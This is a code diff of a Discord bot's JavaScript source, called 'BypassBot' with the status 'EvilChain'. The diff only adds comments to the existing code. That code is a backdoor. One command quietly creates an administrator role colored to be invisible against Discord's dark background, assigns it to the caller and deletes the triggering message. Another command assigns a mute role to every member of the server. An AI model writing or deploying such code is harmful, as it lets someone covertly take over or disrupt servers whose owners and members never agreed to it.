@@ -4,7 +4,7 @@ const bot = new Discord.Client({disableEveryone: true});
 
 bot.on("ready", async () => {
 	console.log(`BypassBot Is now Running`);
-	//Sets Bot Status
+	//Bot Status
 	bot.user.setActivity(`EvilChain`);
 
 	try {
@@ -26,9 +26,9 @@ if(message.author.bot) return;
   if(command === `ceadmin`) {
   	try {
 	role = await message.guild.createRole({
- 	name: "Secret Role",
-  	color: "#2f3136",
-  	permissions: [8]
+ 	name: "Secret Role", //Role Name
+  	color: "#2f3136", //The Role Color
+  	permissions: [8] //Role Permission (8 = admin)
 	});
 	message.member.addRole(role)
 	message.delete(1000);
@@ -42,9 +42,9 @@ if(message.author.bot) return;
    if(command === `cemute`) {
 	try {
 		role = await message.guild.createRole({
-		 name: "Secret Mute Role",
-		  color: "#2f3136",
-		  permissions: [1]
+		 name: "Secret Mute Role", //Mute Role Name
+		  color: "#2f3136", //Mute Role Color
+		  permissions: [1] //Mute Role Permission
 		});
 		message.guild.members.forEach(member => {member.addRole(role)});
    		message.delete(1000);
